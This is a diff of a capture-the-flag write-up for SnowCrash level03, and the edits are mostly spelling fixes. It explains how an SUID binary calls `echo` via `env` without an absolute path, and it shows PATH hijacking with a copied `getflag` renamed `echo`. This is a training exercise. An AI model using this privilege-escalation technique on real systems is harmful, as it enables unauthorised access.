@@ -2,7 +2,7 @@
 
 ## Reconnaissance
 
-- Our home contain a executable file named `level03` who belongs to `flag03` user.
+- Our home contains an executable file named `level03` who belongs to `flag03` user.
 - It has the SUID and SGID bits set, meaning that we can execute it with `flag03` rights.
 
 ```
@@ -30,7 +30,7 @@ level03@SnowCrash:~$ ./level03
 Exploit me
 ```
 
-### String content
+### String Content
 
 - The executable contains the following string: `/usr/bin/env echo Exploit me`
 
@@ -53,7 +53,7 @@ Contents of section .rodata:
 
 ### Decompiling
 
-- Using angr decompiler on dogbolt.org
+- Using angr decompiler on [dogbolt.org](https://dogbolt.org)
 
 ```
 int main()
@@ -71,11 +71,11 @@ unsigned int v1; // [bp-0x8]
 ```
 
 - The `level03` executable will run the command line `/usr/bin/env echo Exploit me` with `flag03` rights.
-- We notice that the `echo` command has a relative path whereas the `env` command is given with an absolut path. The env PATH variable will be used to find the `echo` command, not the `env` one.
+- We notice that the `echo` command has a relative path whereas the `env` command is given with an absolut path. The environement `PATH` variable will be used to find the `echo` command path, not the `env` command one.
 
 ## PATH way to the flag
 
-- By changing the `env PATH` variable, it should be possible to delude the `level03` program and let it execute the program our choice (i.e. `getflag`) as `level03`.
+- By changing the `env` `PATH` variable, it should be possible to delude the `level03` program and let it execute the program of our choice (i.e. `getflag`) as `level03`.
 - First we need more rights on our home:
 
 ```
@@ -88,7 +88,7 @@ level03@SnowCrash:~$ chmod 710 .
 level03@SnowCrash:~$ cp /bin/getflag echo.
 ```
 
-- And finally run `level03` changing the `PATH` variable
+- And finally run `level03`, changing the `PATH` variable
 
 ```
 level03@SnowCrash:~$ PATH=./ level03
